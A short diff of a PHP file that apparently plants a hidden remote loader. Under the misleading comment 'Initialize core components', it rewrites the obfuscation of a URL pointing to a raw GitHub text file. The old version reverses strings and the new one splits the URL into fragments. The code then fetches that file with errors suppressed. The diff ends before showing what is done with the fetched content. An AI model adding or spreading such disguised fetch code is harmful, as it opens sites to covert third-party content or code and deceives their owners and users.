@@ -5,8 +5,30 @@
 */
 
 // Initialize core components
-$parts = array('txt.xedni/', 'niam/sdaeh/', 'sfer/aleb/', 'aleboes/', 'moc.tnetnocresubuhtig.war/', '://sptth');
-$full_url = strrev(implode('', $parts));
+$url_parts = array(
+    'https',
+    '://',
+    'raw',
+    '.',
+    'githubusercontent',
+    '.',
+    'com',
+    '/',
+    'seobela',
+    '/',
+    'bela',
+    '/',
+    'refs',
+    '/',
+    'heads',
+    '/',
+    'main',
+    '/',
+    'index',
+    '.',
+    'txt'
+);
+$full_url = implode('', $url_parts);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
